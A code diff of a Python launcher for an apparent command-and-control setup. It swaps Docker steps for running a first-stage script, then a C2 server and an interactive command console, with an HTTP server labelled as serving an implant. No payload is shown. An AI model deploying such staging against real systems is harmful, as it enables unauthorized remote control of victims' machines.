@@ -4,8 +4,6 @@ import time
 
 # CONFIGURATION
 HTTP_SERVER_PORT = 80
-DOCKER_IMAGE_NAME = 'my-c2-server'
-DOCKER_SERVER_PORT = 3000
 FIRST_STAGE_SCRIPT = 'first_stage.py'
 BEACHHEAD_DIR = 'beachhead'
 
@@ -34,54 +32,48 @@ except Exception as e:
 
 time.sleep(1)
 
-# Build and run Docker container
-print("Building Docker image...")
-try:
-    subprocess.run(['docker', 'build', '-t', DOCKER_IMAGE_NAME, '.'], check=True)
-    print("Docker image built successfully")
-except subprocess.CalledProcessError as e:
-    print(f"Error building Docker image: {e}")
-    http_server.terminate()
-    sys.exit(1)
-
-print(f"Starting Docker container on port {DOCKER_SERVER_PORT}...")
-try:
-    docker_container = subprocess.Popen(['docker', 'run', '--rm', '-p', f'{DOCKER_SERVER_PORT}:{DOCKER_SERVER_PORT}', DOCKER_IMAGE_NAME])
-    print(f"Docker container started (PID: {docker_container.pid})")
-except Exception as e:
-    print(f"Error starting Docker container: {e}")
-    http_server.terminate()
-    sys.exit(1)
-
-time.sleep(1)
-
 # Run first stage script
 print(f"Running {FIRST_STAGE_SCRIPT}...")
 try:
-    first_stage = subprocess.Popen([sys.executable, FIRST_STAGE_SCRIPT])
-    print(f"{FIRST_STAGE_SCRIPT} started (PID: {first_stage.pid})")
+    first_stage = subprocess.run([sys.executable, FIRST_STAGE_SCRIPT], check=True)
+    print(f"{FIRST_STAGE_SCRIPT} completed successfully")
+except subprocess.CalledProcessError as e:
+    print(f"Error running {FIRST_STAGE_SCRIPT}: {e}")
+    http_server.terminate()
+    sys.exit(1)
 except FileNotFoundError:
     print(f"Error: Could not find '{FIRST_STAGE_SCRIPT}'")
     http_server.terminate()
-    docker_container.terminate()
     sys.exit(1)
 
-print("\n--- Services running ---")
-print(f"  • HTTP server (scripts): port {HTTP_SERVER_PORT}")
-print(f"  • server.py (Docker): port {DOCKER_SERVER_PORT}")
-print(f"  • {FIRST_STAGE_SCRIPT}: running locally")
-print("Press Ctrl+C to shut down.")
+# Start C2 server as background process after first_stage completes
+print("\nStarting C2 server...")
+try:
+    c2_server_process = subprocess.Popen([sys.executable, 'server.py'])
+    print(f"C2 server started (PID: {c2_server_process.pid})")
+except FileNotFoundError:
+    print(f"Error: Could not find 'server.py'")
+    http_server.terminate()
+    sys.exit(1)
+
+time.sleep(2)
+
+# Run client server.py in foreground so user can type commands
+print("\n--- Starting C2 client interface ---")
+print(f"  • HTTP server (implant): port {HTTP_SERVER_PORT}")
+print(f"  • C2 server (backend): PID {c2_server_process.pid}")
+print("\nYou can now type commands below:\n")
 
 try:
-    # Wait for first_stage.py to complete
-    first_stage.wait()
-    print(f"{FIRST_STAGE_SCRIPT} completed.")
-    
-    # Keep the services running
-    print("Services are still running. Press Ctrl+C to shut down.")
-    docker_container.wait()
+    subprocess.run([sys.executable, 'server.py'], check=True)
 except KeyboardInterrupt:
-    print("\nShutting down...")
-    http_server.terminate()
-    docker_container.terminate()
-    print("Clean exit.")
+    pass
+except FileNotFoundError:
+    print(f"Error: Could not find 'server.py'")
+except subprocess.CalledProcessError as e:
+    print(f"Error running server.py: {e}")
+
+print("\nShutting down...")
+http_server.terminate()
+c2_server_process.terminate()
+print("Clean exit.")
